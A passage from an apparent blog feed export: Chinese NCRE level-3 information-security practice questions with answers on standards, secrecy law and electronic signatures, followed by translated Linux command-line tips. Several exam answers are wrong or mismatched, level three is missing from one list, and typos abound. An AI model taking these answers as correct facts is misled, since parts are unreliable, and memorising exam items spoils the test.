<h2 id="工作人员上岗前、在岗期间以及离职时，人员安全的控制措施分别有哪些？"><a href="#工作人员上岗前、在岗期间以及离职时，人员安全的控制措施分别有哪些？" class="headerlink" title="工作人员上岗前、在岗期间以及离职时，人员安全的控制措施分别有哪些？"></a>工作人员上岗前、在岗期间以及离职时，人员安全的控制措施分别有哪些？</h2><p>定期对不同岗位的人员进行考核，考核包括政治思想、保密观念和业务技术等多各方面</p>
<p>定期对系统的所以工作人员从政治思想业务水平、工作表现等方面进行考核，对不适于接触信息系统能够的人员要适时调离</p>
<p>员工从一般岗位转到信息安全重要岗位，组织机构也应当对其进行信用检查。对于处在有相当权力位置的人员，这种检查应定期进行</p>
<h2 id="风险评估中，风险值由哪些因素决定？请写出计算公式"><a href="#风险评估中，风险值由哪些因素决定？请写出计算公式" class="headerlink" title="风险评估中，风险值由哪些因素决定？请写出计算公式"></a>风险评估中，风险值由哪些因素决定？请写出计算公式</h2><p>风险 ＝ 出现漏洞的可能性 × 信息资产的价值 － 当前控制减轻的风险概率 ＋ 对漏洞了解的不确定性</p>
<h2 id="为保证网络通信线路的安全，应注意哪几个方面？"><a href="#为保证网络通信线路的安全，应注意哪几个方面？" class="headerlink" title="为保证网络通信线路的安全，应注意哪几个方面？"></a>为保证网络通信线路的安全，应注意哪几个方面？</h2><ul>
<li>用于数据传输的线路应符合有关标准，如线路噪声不应超标等</li>
<li>传输线路应采用屏蔽电缆并有露天保护或埋于地下，要求远距离电线路或强电磁场反射源，以减少由于干预引起的数据错误</li>
<li>铺设电缆应采用金属套装、屏蔽电缆或加装金属套装，以减少各种辐射对路线的干扰，定期检查各线段及接点，更换老化变质的电缆</li>
<li>定期检查接线盒及其他易被人接近的线路部位</li>
<li>定期测试信号轻度，检查是否有非法装置接入线路</li>
<li>配置必要的检查设备，以发现非法窃听</li>
<li>如果条件许可或是信息安全需要，可以使用光缆，光缆对非法窃听很敏感，但容易被发现</li>
<li>调试解调器应放置在收监视的区域，以便即时发现和防止外来连接的企图，调制解调器的连接应定期检验，以检验是否有篡改行为</li>
</ul>
<h2 id="信息安全管理认证的依据与范围、申请认证的基本条件有哪些？"><a href="#信息安全管理认证的依据与范围、申请认证的基本条件有哪些？" class="headerlink" title="信息安全管理认证的依据与范围、申请认证的基本条件有哪些？"></a>信息安全管理认证的依据与范围、申请认证的基本条件有哪些？</h2><p>认证的依据：BS7799-2：1999标准</p>
<p>认证范围通常与它实施安全管理体系的范围是相同的但，并不需要必须相同</p>
<p>基本条件：</p>
<ul>
<li>努力遵循法律法规的行为，已北相关机构认识</li>
<li>体系文件完全符合标准要求</li>
<li>体系已被有效实施，即组织结构在风险评估的基础上，识别出需要保护的关键信息资产、制定信息安全方针、确定安全控制目标与控制方式并实施、完成体系审核与评估活动并采取相应的纠正预防措施</li>
</ul>
<h2 id="系统运行阶段的维护活动通常有哪几类？"><a href="#系统运行阶段的维护活动通常有哪几类？" class="headerlink" title="系统运行阶段的维护活动通常有哪几类？"></a>系统运行阶段的维护活动通常有哪几类？</h2><ul>
<li>改正性维护：诊断和改正在使用过程重发现的系统错误</li>
<li>适合性维护：修改系统以适应环境的变化</li>
<li>完善性维护：根据用户的要求改进或扩充系统使其更完善</li>
<li>预防性维护：修改系统为将来的维护活动做准备</li>
</ul>
<h2 id="简述影响维护代价的技术因素和非技术因素"><a href="#简述影响维护代价的技术因素和非技术因素" class="headerlink" title="简述影响维护代价的技术因素和非技术因素"></a>简述影响维护代价的技术因素和非技术因素</h2><ul>
<li>技术因素<ul>
<li>软件对运行环境的依赖性</li>
<li>编程语言</li>
<li>编程风格</li>
<li>测试与改错工作</li>
<li>文档的质量</li>
</ul>
</li>
<li>非技术因素<ul>
<li>应用域的复杂性</li>
<li>开发人员的复杂性</li>
<li>系统的生命周期</li>
<li>业务操作模式变化对系统的影响</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题7</title>
    <url>/posts/dfaa872a/</url>
    <content><![CDATA[<p><strong>七、信息安全标准与法规</strong></p>
<h1 id="填空"><a href="#填空" class="headerlink" title="填空"></a>填空</h1><h2 id="信息技术安全评价的通用标准（CC）是由-、-、-、-、-、-6个国家于1996年联合提出的"><a href="#信息技术安全评价的通用标准（CC）是由-、-、-、-、-、-6个国家于1996年联合提出的" class="headerlink" title="信息技术安全评价的通用标准（CC）是由 ___、___、___、___、___、___ 6个国家于1996年联合提出的"></a>信息技术安全评价的通用标准（CC）是由 <strong>___、___、___、___、___、___</strong> 6个国家于1996年联合提出的</h2><p>美国、加拿大、英国、法国、德国、荷兰</p>
<a id="more"></a>
<h2 id="CC将评估过程划分为-和-两个部分"><a href="#CC将评估过程划分为-和-两个部分" class="headerlink" title="CC将评估过程划分为 ___和___ 两个部分"></a>CC将评估过程划分为 <strong>___和___</strong> 两个部分</h2><p>功能、保证</p>
<h2 id="CC评估等级每一级均需评估7个功能类，分别是-、-、-、-、-、-、"><a href="#CC评估等级每一级均需评估7个功能类，分别是-、-、-、-、-、-、" class="headerlink" title="CC评估等级每一级均需评估7个功能类，分别是 ___、___、___、___、___、___、___"></a>CC评估等级每一级均需评估7个功能类，分别是 <strong>___、___、___、___、___、___、___</strong></h2><p>EAL1 到 EAL7：</p>
<p>配置管理、分发和操作、开发过程、指导文献、生命期的技术支持、测试、脆弱性评估</p>
<h2 id="信息安全管理基本技术要求从-、-、-、-、-5个层面提出（4）"><a href="#信息安全管理基本技术要求从-、-、-、-、-5个层面提出（4）" class="headerlink" title="信息安全管理基本技术要求从 ___、___、___、___、___ 5个层面提出（4）"></a>信息安全管理基本技术要求从 <strong>___、___、___、___、___</strong> 5个层面提出（4）</h2><p>安全通信网络、安全区域边界、安全计算环境、安全管理中心</p>
<h2 id="信息安全管理基本管理要求从-、-、-、-、-5个方面提出"><a href="#信息安全管理基本管理要求从-、-、-、-、-5个方面提出" class="headerlink" title="信息安全管理基本管理要求从 ___、___、___、___、___ 5个方面提出"></a>信息安全管理基本管理要求从 <strong>___、___、___、___、___</strong> 5个方面提出</h2><p>安全管理制度、安全管理机构、安全管理人员、建设管理、运维管理</p>
<h2 id="与信息安全标准化有关的主要国际化组织有-、-、-等"><a href="#与信息安全标准化有关的主要国际化组织有-、-、-等" class="headerlink" title="与信息安全标准化有关的主要国际化组织有 ___、___、___ 等"></a>与信息安全标准化有关的主要国际化组织有 <strong>___、___、___</strong> 等</h2><p>国际标准组织（ISO）、国际电工委员会（IEC）、国际电信联盟（ITU）</p>
<h2 id="与信息安全相关的法律条文有-、-、-等"><a href="#与信息安全相关的法律条文有-、-、-等" class="headerlink" title="与信息安全相关的法律条文有 ___、___、___ 等"></a>与信息安全相关的法律条文有 <strong>___、___、___</strong> 等</h2><p>网络安全法、保守国家秘密法、电子签名法</p>
<h2 id="CNITSEC-是-的简称"><a href="#CNITSEC-是-的简称" class="headerlink" title="CNITSEC 是 ___ 的简称"></a>CNITSEC 是 <strong>___</strong> 的简称</h2><p>中国信息安全测评中心</p>
<h2 id="ISO13335-标准首次给出了关于IT安全的-、-、-、-、-、-6个方面的含义"><a href="#ISO13335-标准首次给出了关于IT安全的-、-、-、-、-、-6个方面的含义" class="headerlink" title="ISO13335 标准首次给出了关于IT安全的 ___、___、___、___、___、___ 6个方面的含义"></a>ISO13335 标准首次给出了关于IT安全的 <strong>___、___、___、___、___、___</strong> 6个方面的含义</h2><p>保密性、完整性、可用性、审计性、认证性、 可靠性</p>
<h2 id="《计算机信息系统安全保护等级划分准则》将信息系统安全分为-、-、-、-、-5个等级"><a href="#《计算机信息系统安全保护等级划分准则》将信息系统安全分为-、-、-、-、-5个等级" class="headerlink" title="《计算机信息系统安全保护等级划分准则》将信息系统安全分为 ___、___、___、___、___ 5个等级"></a>《计算机信息系统安全保护等级划分准则》将信息系统安全分为 <strong>___、___、___、___、___</strong> 5个等级</h2><ul>
<li>第一级：用户自主<strong>保护</strong>级；</li>
<li>第二级：<strong>系统</strong>审计<strong>保护</strong>级；</li>
<li>第三级：<strong>安全</strong>标记<strong>保护</strong>级；</li>
<li>第四级：结构化<strong>保护</strong>级；</li>
<li>第<strong>五</strong>级：访问验证<strong>保护</strong>级。</li>
</ul>
<h2 id="《信息系统安全保护等级划分准则》中提出了定级的4个要素-、-、-、"><a href="#《信息系统安全保护等级划分准则》中提出了定级的4个要素-、-、-、" class="headerlink" title="《信息系统安全保护等级划分准则》中提出了定级的4个要素 : ___、___、___、___"></a>《信息系统安全保护等级划分准则》中提出了定级的4个要素 : <strong>___、___、___、___</strong></h2><p>信息系统所属类型、业务数据类型、信息系统服务范围i、业务自动化处理程度</p>
<h2 id="国家秘密的保密期限，除另有规定外，绝密级不超过-，机密级不超过-，秘密级不超"><a href="#国家秘密的保密期限，除另有规定外，绝密级不超过-，机密级不超过-，秘密级不超" class="headerlink" title="国家秘密的保密期限，除另有规定外，绝密级不超过 ___ ，机密级不超过 ___ ，秘密级不超 ___"></a>国家秘密的保密期限，除另有规定外，绝密级不超过 <strong>___</strong> ，机密级不超过 <strong>___</strong> ，秘密级不超 <strong>___</strong></h2><p>30年、20年、10年</p>
<h2 id="称持有电子签名制作数据并以本人身份或者以其所代表的人的名义实施电子签名的人为"><a href="#称持有电子签名制作数据并以本人身份或者以其所代表的人的名义实施电子签名的人为" class="headerlink" title="称持有电子签名制作数据并以本人身份或者以其所代表的人的名义实施电子签名的人为 ___"></a>称持有电子签名制作数据并以本人身份或者以其所代表的人的名义实施电子签名的人为 <strong>___</strong></h2><p>电子签名人</p>
<h2 id="信息系统的安全保护等级由-和-两个定级要素决定"><a href="#信息系统的安全保护等级由-和-两个定级要素决定" class="headerlink" title="信息系统的安全保护等级由 ___和___ 两个定级要素决定"></a>信息系统的安全保护等级由 <strong>___和___</strong> 两个定级要素决定</h2><p>等级保护对象受到破坏时所侵害的客体、客体造成侵害的程度</p>
<h2 id="商用密码技术属于国家秘密。国家对商用密码产品的-、-、-、-实行专控管理"><a href="#商用密码技术属于国家秘密。国家对商用密码产品的-、-、-、-实行专控管理" class="headerlink" title="商用密码技术属于国家秘密。国家对商用密码产品的 ___、___、___、___ 实行专控管理"></a>商用密码技术属于国家秘密。国家对商用密码产品的 <strong>___、___、___、___</strong> 实行专控管理</h2><p>科研、生产、销售、使用</p>
<h2 id="《计算机信息系统安全保护等级划分准则》主要的安全考核指标有-、-、-、-等"><a href="#《计算机信息系统安全保护等级划分准则》主要的安全考核指标有-、-、-、-等" class="headerlink" title="《计算机信息系统安全保护等级划分准则》主要的安全考核指标有 ___、___、___、___ 等"></a>《计算机信息系统安全保护等级划分准则》主要的安全考核指标有 <strong>___、___、___、___</strong> 等</h2><p>公民、法人和其他组织的合法权益</p>
<p>社会秩序</p>
<p>公共利益</p>
<p>国际安全</p>
<h2 id="涉密信息系统建设使用单位应当依据涉密信息系统分级保护管理规范和技术标准，按照-、-、-三级的不同要求"><a href="#涉密信息系统建设使用单位应当依据涉密信息系统分级保护管理规范和技术标准，按照-、-、-三级的不同要求" class="headerlink" title="涉密信息系统建设使用单位应当依据涉密信息系统分级保护管理规范和技术标准，按照 ___、___、___ 三级的不同要求"></a>涉密信息系统建设使用单位应当依据涉密信息系统分级保护管理规范和技术标准，按照 <strong>___、___、___</strong> 三级的不同要求</h2><p>绝密、机密、秘密</p>
<h1 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h1><h2 id="加强信息安全保障工作的主要原则包括哪些？"><a href="#加强信息安全保障工作的主要原则包括哪些？" class="headerlink" title="加强信息安全保障工作的主要原则包括哪些？"></a>加强信息安全保障工作的主要原则包括哪些？</h2><ul>
<li>尊重维护网络空间主权</li>
<li>和平利用网络空间</li>
<li>依法治理网络空间</li>
<li>统筹网络安全与发展</li>
</ul>
<h2 id="信息系统的安全保护等级分为哪五级？"><a href="#信息系统的安全保护等级分为哪五级？" class="headerlink" title="信息系统的安全保护等级分为哪五级？"></a>信息系统的安全保护等级分为哪五级？</h2><p>第一级，信息系统受到破坏后，会对公民法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益</p>
<p>第二级，信息系统受到破坏后，会对公民法人和其他组织的合法权益产生严重损害，或对社会秩序和公共利益造成损害，但不损害国家安全</p>
<p>第四级，信息系统受到破坏后，会对社会秩序和公共利益造成特别严重损害，或对国家安全造成严重损害</p>
<p>第五级，信息系统受到破坏后，会国家安全造成特别严重损害</p>
<h2 id="国家秘密的密级分为哪三级？各级简要描述是什么？"><a href="#国家秘密的密级分为哪三级？各级简要描述是什么？" class="headerlink" title="国家秘密的密级分为哪三级？各级简要描述是什么？"></a>国家秘密的密级分为哪三级？各级简要描述是什么？</h2><p>绝密、机密、秘密</p>
<p>绝密级国家秘密是最重要的国家秘密，泄漏会使国家安全和利益遭受特别严重的损害</p>
<p>机密级国家秘密是重要的国家秘密，泄漏会使国家安全和利益遭受严重的损害</p>
<p>秘密级国家秘密是一般的国家秘密，泄漏会使国家安全和利益遭受损害</p>
<h2 id="加强政府信息系统安全和保密管理工作应坚持的四项基本要求是什么？"><a href="#加强政府信息系统安全和保密管理工作应坚持的四项基本要求是什么？" class="headerlink" title="加强政府信息系统安全和保密管理工作应坚持的四项基本要求是什么？"></a>加强政府信息系统安全和保密管理工作应坚持的四项基本要求是什么？</h2><h2 id="法律意义上电子签名视为可靠需同时符合哪些条件？"><a href="#法律意义上电子签名视为可靠需同时符合哪些条件？" class="headerlink" title="法律意义上电子签名视为可靠需同时符合哪些条件？"></a>法律意义上电子签名视为可靠需同时符合哪些条件？</h2><ul>
<li>电子签名制作数据用于电子签名时，属于电子签名人专有</li>
<li>签署时电子签名制作数据仅由电子签名人控制</li>
<li>签署后对电子签名的任何改动能够被发现</li>
<li>签署后对数据电文内容和形式的任何改动能够被发现。当事人也可以选择使用符合其约定的可靠条件的电子签名</li>
</ul>
<h2 id="审查数据电文作为证据的真实性，应当考虑什么因素？"><a href="#审查数据电文作为证据的真实性，应当考虑什么因素？" class="headerlink" title="审查数据电文作为证据的真实性，应当考虑什么因素？"></a>审查数据电文作为证据的真实性，应当考虑什么因素？</h2><ul>
<li>生产、存储或传递数据电文方法的可靠性</li>
<li>保持内容完整性方法的可靠性</li>
<li>用以鉴别发件人方法的可靠性</li>
<li>其他相关因素</li>
</ul>
<h2 id="简述《信息技术安全性评估准则》-CC-所确定的标准的优点"><a href="#简述《信息技术安全性评估准则》-CC-所确定的标准的优点" class="headerlink" title="简述《信息技术安全性评估准则》(CC)所确定的标准的优点"></a>简述《信息技术安全性评估准则》(CC)所确定的标准的优点</h2><ul>
<li>提倡安全工程的思想，通过信息安全产品的评估，确保产品的安全性</li>
<li>通过参数化，解决安全特性在不同产品与系统间存在的差异</li>
<li>不再强调功能的级别，而是强调保证的级别，注重非技术性因素的评价</li>
<li>从两个侧面，即安全功能和安全保证方面，描述产品的安全模型，并覆盖了物理、网络、安全特性的三维安全框架架构的绝大部分内容</li>
<li>将公认的安全需求制定成相关的标准文档，用户可以直接使用，利于标准的推广以及用户间的共享</li>
<li>安全功能、安全保证及安全评价之间相互独立，安全功能需求定义来所期望的安全行为，安全保证需求是有效实施安全措施的基础，而安全评价则是测定安全功能需求与保证需求的可性程度</li>
</ul>
<h2 id="销售商用密码产品，应当向国家密码管理机构提出申请，并应当具备什么条件？"><a href="#销售商用密码产品，应当向国家密码管理机构提出申请，并应当具备什么条件？" class="headerlink" title="销售商用密码产品，应当向国家密码管理机构提出申请，并应当具备什么条件？"></a>销售商用密码产品，应当向国家密码管理机构提出申请，并应当具备什么条件？</h2><ul>
<li>有熟悉商用秘密产品知识和承担售后服务的人员</li>
<li>有完善的销售服务和安全管理规章制度</li>
<li>有独立的法人资格</li>
</ul>
<h2 id="我国网络空间安全战略的目标是什么？"><a href="#我国网络空间安全战略的目标是什么？" class="headerlink" title="我国网络空间安全战略的目标是什么？"></a>我国网络空间安全战略的目标是什么？</h2><p>以总体国家安全观为指导，贯彻落实创新、协调、绿色、开放、共享的发展理念，增强风险意识和危机意识，统筹国内国际两个大局，统筹发展安全两件大事，积极防御、有效应付，推进网络空间和平、安全、开放、合法、有序，维护国家主权、安全、发展利益，实现建设网络强国的战略目标</p>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>超好用的Linux命令</title>
    <url>/posts/d4e894da/</url>
    <content><![CDATA[<h1 id="删除一个大文件"><a href="#删除一个大文件" class="headerlink" title="删除一个大文件"></a>删除一个大文件</h1><p>有一个很大的200GB的日志文件需要删除。rm和ls命令崩溃，可能是由于巨大的磁盘IO造成的，要删除这个大文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &#x2F;path&#x2F;to&#x2F;file.log </span><br><span class="line"># 或 </span><br><span class="line">: &gt; &#x2F;path&#x2F;to&#x2F;file.log </span><br><span class="line"># 然后删除</span><br><span class="line">rm &#x2F;path&#x2F;to&#x2F;file.log </span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="如何记录终端输出？"><a href="#如何记录终端输出？" class="headerlink" title="如何记录终端输出？"></a>如何记录终端输出？</h1><p>使用script命令行工具来为终端输出创建记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script my.terminal.sessio </span><br></pre></td></tr></table></figure>
<p>输入命令测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls </span><br><span class="line">date</span><br><span class="line">sudo service foo stop </span><br></pre></td></tr></table></figure>
<p>结束script会话，输入  <code>exit</code>  或者 logout 或者按下 <code>Ctrl-D</code></p>
<p>浏览记录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more my.terminal.session </span><br><span class="line">less my.terminal.session </span><br><span class="line">cat my.terminal.session </span><br></pre></td></tr></table></figure></p>
<h1 id="还原被删除的-tmp-文件夹"><a href="#还原被删除的-tmp-文件夹" class="headerlink" title="还原被删除的 /tmp 文件夹"></a>还原被删除的 /tmp 文件夹</h1><p>恢复意外地删除了/tmp文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp </span><br><span class="line">chmod 1777 &#x2F;tmp </span><br><span class="line">chown root:root &#x2F;tmp </span><br><span class="line">ls -ld &#x2F;tmp </span><br></pre></td></tr></table></figure>
<h1 id="锁定一个文件夹"><a href="#锁定一个文件夹" class="headerlink" title="锁定一个文件夹"></a>锁定一个文件夹</h1><p>为文件夹<code>/downloads</code> 添加锁定保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 0000 &#x2F;downloads </span><br></pre></td></tr></table></figure>
<p>root用户仍旧可以访问，而ls和cd命令则不能用，需要还原使用以下命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 0755 &#x2F;downloads </span><br></pre></td></tr></table></figure></p>
<h1 id="在vim中用密码保护文件"><a href="#在vim中用密码保护文件" class="headerlink" title="在vim中用密码保护文件"></a>在vim中用密码保护文件</h1><p>用vim通过密码保护文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim +X filename </span><br></pre></td></tr></table></figure><br>或者在退出vim前使用 <code>:X</code>  加密文件，vim会提示输入一个密码</p>
<h1 id="清除屏幕上的乱码"><a href="#清除屏幕上的乱码" class="headerlink" title="清除屏幕上的乱码"></a>清除屏幕上的乱码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reset </span><br></pre></td></tr></table></figure>
<h1 id="易读格式"><a href="#易读格式" class="headerlink" title="易读格式"></a>易读格式</h1><p>传递-h或者-H（和其他选项）选项给GNU或者BSD工具来获取像ls、df、du等命令以易读的格式输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -lh </span><br><span class="line"></span><br><span class="line"># 以易读的格式 (比如： 1K 234M 2G) </span><br><span class="line">df -h </span><br><span class="line">df -k </span><br><span class="line"></span><br><span class="line"># 以字节、KB、MB 或 GB 输出：  </span><br><span class="line">free -b </span><br><span class="line">free -k </span><br><span class="line">free -m </span><br><span class="line">free -g </span><br><span class="line"></span><br><span class="line"># 以易读的格式输出 (比如 1K 234M 2G) </span><br><span class="line">du -h </span><br><span class="line"></span><br><span class="line"># 以易读的格式显示文件系统权限 </span><br><span class="line">stat -c %A &#x2F;boot </span><br><span class="line"></span><br><span class="line"># 比较易读的数字 </span><br><span class="line">sort -h -a file </span><br><span class="line"></span><br><span class="line"># 在Linux上以易读的形式显示cpu信息 </span><br><span class="line">lscpu </span><br><span class="line">lscpu -e </span><br><span class="line">lscpu -e&#x3D;cpu,node </span><br><span class="line"></span><br><span class="line"># 以易读的形式显示每个文件的大小 </span><br><span class="line">tree -h </span><br><span class="line">tree -h &#x2F;boot </span><br></pre></td></tr></table></figure></p>
<h1 id="在Linux系统中显示已知的用户信息"><a href="#在Linux系统中显示已知的用户信息" class="headerlink" title="在Linux系统中显示已知的用户信息"></a>在Linux系统中显示已知的用户信息</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># linux 版本 </span><br><span class="line">lslogins </span><br><span class="line"></span><br><span class="line">#BSD 版本 </span><br><span class="line">logins </span><br></pre></td></tr></table></figure>
<h1 id="删除意外在当前文件夹下解压的文件"><a href="#删除意外在当前文件夹下解压的文件" class="headerlink" title="删除意外在当前文件夹下解压的文件"></a>删除意外在当前文件夹下解压的文件</h1><p>意外在<code>/var/www/html/</code>下解压了一个压缩包，使<code>/var/www/html</code>内变混乱，现在需要删除解压出来到文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F; </span><br><span class="line">rm -f &quot;$(tar ztf &#x2F;path&#x2F;to&#x2F;file.tar.gz)&quot; </span><br></pre></td></tr></table></figure></p>
<h1 id="对top命令的输出感到疑惑"><a href="#对top命令的输出感到疑惑" class="headerlink" title="对top命令的输出感到疑惑"></a>对top命令的输出感到疑惑</h1><p>用htop代替top：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo htop </span><br></pre></td></tr></table></figure></p>
<h1 id="想要再次运行相同的命令"><a href="#想要再次运行相同的命令" class="headerlink" title="想要再次运行相同的命令"></a>想要再次运行相同的命令</h1><p>只需要输入<code>!!</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;myhome&#x2F;dir&#x2F;script&#x2F;name arg1 arg2 </span><br><span class="line"></span><br><span class="line"># 要再次运行相同的命令  </span><br><span class="line"></span><br><span class="line">!! </span><br><span class="line"></span><br><span class="line"># 以root用户运行最后运行的命令 </span><br><span class="line"></span><br><span class="line">sudo !! </span><br></pre></td></tr></table></figure><br><code>!</code>会运行最近使用的命令。要运行最近运行的以 <code>foo</code> 开头命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!foo </span><br><span class="line"></span><br><span class="line"># 以root用户运行上一次以 service 开头的命令 </span><br><span class="line"></span><br><span class="line">sudo !service </span><br></pre></td></tr></table></figure><br><code>!$</code>用于运行带上最后一个参数的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑 nginx.conf </span><br><span class="line"></span><br><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;nginx.conf </span><br><span class="line"></span><br><span class="line"># 测试 nginx.conf </span><br><span class="line"></span><br><span class="line">&#x2F;sbin&#x2F;nginx -t -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf </span><br><span class="line"></span><br><span class="line"># 测试完 &quot;&#x2F;sbin&#x2F;nginx -t -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf&quot;可以用vi再次编辑这个文件了 </span><br><span class="line"></span><br><span class="line">sudo vi !$ </span><br></pre></td></tr></table></figure></p>
<h1 id="在终端上提醒你必须得走了"><a href="#在终端上提醒你必须得走了" class="headerlink" title="在终端上提醒你必须得走了"></a>在终端上提醒你必须得走了</h1><p>需要提醒离开终端，输入下面的命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave +hhmm </span><br></pre></td></tr></table></figure></p>
<p><code>hhmm</code> : 时间是以hhmm的形式，hh表示小时（12时制或者24小时制），mm代表分钟。所有的时间都转化成12时制，并且假定发生在接下来的12小时。</p>
<h1 id="甜蜜的家"><a href="#甜蜜的家" class="headerlink" title="甜蜜的家"></a>甜蜜的家</h1><p>返回刚才都目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd - </span><br></pre></td></tr></table></figure><br>快速地回到家目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd </span><br></pre></td></tr></table></figure><br>变量CDPATH定义了目录的搜索路径：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CDPATH&#x3D;&#x2F;var&#x2F;www:&#x2F;nas10 </span><br></pre></td></tr></table></figure><br>现在，不用输入<code>cd /var/www/html/</code> 这样长了，直接输入下面的命令进入 <code>/var/www/html</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd html </span><br></pre></td></tr></table></figure></p>
<h1 id="在less浏览时编辑文件"><a href="#在less浏览时编辑文件" class="headerlink" title="在less浏览时编辑文件"></a>在less浏览时编辑文件</h1><p>要编辑一个正在用<code>less</code>浏览的文件，可以按下<code>v</code> ,可以用变量$EDITOR所指定的编辑器来编辑<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less *.c </span><br><span class="line"></span><br><span class="line">less foo.html </span><br><span class="line"></span><br><span class="line"># 按下v键来编辑文件</span><br><span class="line"># 退出编辑器后，你可以继续用less浏览</span><br></pre></td></tr></table></figure></p>
<h1 id="列出你系统中的所有文件和目录"><a href="#列出你系统中的所有文件和目录" class="headerlink" title="列出你系统中的所有文件和目录"></a>列出你系统中的所有文件和目录</h1><p>要看系统中的所有目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type d | less </span><br><span class="line"></span><br><span class="line"># 列出 $HOME 所有目录 </span><br><span class="line"></span><br><span class="line">find $HOME -type d -ls | less </span><br></pre></td></tr></table></figure><br>要看到所有的文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f | less </span><br><span class="line"></span><br><span class="line"># 列出 $HOME 中所有的文件 </span><br><span class="line"></span><br><span class="line">find $HOME -type f -ls | less </span><br></pre></td></tr></table></figure></p>
<h1 id="创建目录树"><a href="#创建目录树" class="headerlink" title="创建目录树"></a>创建目录树</h1><p>用<code>mkdir</code>加上-p选项创建一个目录树，用<code>&#123;&#125;</code>创建多个目录(中间用<code>,</code>隔开)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p ~&#x2F;jail&#x2F;&#123;dev,bin,sbin,etc,usr,lib,lib64&#125;&#x2F;&#123;test1,test2&#125;</span><br><span class="line"></span><br><span class="line">tree ~&#x2F;jail&#x2F;</span><br></pre></td></tr></table></figure></p>
<h1 id="将文件复制到多个目录中"><a href="#将文件复制到多个目录中" class="headerlink" title="将文件复制到多个目录中"></a>将文件复制到多个目录中</h1><p>原始操作<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;usr&#x2F;dir1 </span><br><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;var&#x2F;dir2 </span><br><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;nas&#x2F;dir3 </span><br></pre></td></tr></table></figure></p>
<p>高效操作<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;usr&#x2F;dir1 &#x2F;var&#x2F;dir2 &#x2F;nas&#x2F;dir3 | xargs -n 1 cp -v &#x2F;path&#x2F;to&#x2F;file </span><br></pre></td></tr></table></figure></p>
<h1 id="快速找出两个目录的不同"><a href="#快速找出两个目录的不同" class="headerlink" title="快速找出两个目录的不同"></a>快速找出两个目录的不同</h1><p><code>diff</code>命令会按行比较文件。但是它也可以比较两个目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;tmp&#x2F;r </span><br><span class="line"></span><br><span class="line">ls -l &#x2F;tmp&#x2F;s </span><br><span class="line"></span><br><span class="line"># 使用 diff 比较两个文件夹 </span><br><span class="line"></span><br><span class="line">diff &#x2F;tmp&#x2F;r&#x2F; &#x2F;tmp&#x2F;s&#x2F; </span><br></pre></td></tr></table></figure></p>
<h1 id="文本格式化"><a href="#文本格式化" class="headerlink" title="文本格式化"></a>文本格式化</h1><p>可以用 <code>fmt</code> 命令重新格式化每个段落。分割超长的行并且填充短行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmt file.txt </span><br></pre></td></tr></table></figure><br>也可以分割长的行，但是不重新填充，也就是说分割长行，但是不填充短行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmt -s file.txt </span><br></pre></td></tr></table></figure></p>
<h1 id="可以看见输出并将其写入到一个文件中"><a href="#可以看见输出并将其写入到一个文件中" class="headerlink" title="可以看见输出并将其写入到一个文件中"></a>可以看见输出并将其写入到一个文件中</h1><p>使用 <code>tee</code> 命令在屏幕上看见输出并同样写入到日志文件my.log中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mycoolapp arg1 arg2 input.file | tee my.log </span><br></pre></td></tr></table></figure><br>tee可以保证同时在屏幕上看到<code>mycoolapp</code>的输出并写入文件  my.log。</p>
<p>原文：<a href="http://www.cyberciti.biz/open-source/command-line-hacks/20-unix-command-line-tricks-part-i/">http://www.cyberciti.biz/open-source/command-line-hacks/20-unix-command-line-tricks-part-i/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
